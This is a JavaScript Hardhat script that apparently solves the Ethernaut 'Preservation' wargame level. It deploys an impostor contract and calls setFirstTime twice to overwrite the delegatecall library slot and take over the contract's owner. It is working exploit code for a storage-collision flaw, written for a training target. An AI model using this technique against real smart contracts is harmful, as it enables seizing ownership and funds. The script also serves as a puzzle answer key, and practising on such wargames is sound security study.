const { ethers } = require("hardhat");
const Runner = require('./lib/runner');
const Deployer = require('./deployer');

Runner.run(async (provider, owner) => { 
    
    //PLACE Preservation CONTRACT ADDRESS HERE (Ethernaut: contract.address)
    const contractAddr = "0xDC0C662aD9Ad7B1d8a536417A6E42D6D91E89848"; 
    
    //get the Ethernaut Preservation contract 
    const contract = await ethers.getContractAt("Preservation", contractAddr);
    
    //deploy impostor contract
    const impostor = await Deployer.deploy();
    
    console.log();
    console.log("* * * ");
    console.log(`original owner is: ${await contract.owner()}`);
    
    //modify the first memory slot of the contract 
    await contract.setFirstTime(impostor.address);
    
    //now invoke the impostor library contract 
    await contract.setFirstTime(owner.address);
    
    //announce the new owner 
    console.log(`new owner is: ${await contract.owner()}`);
    console.log("* * * ");
});
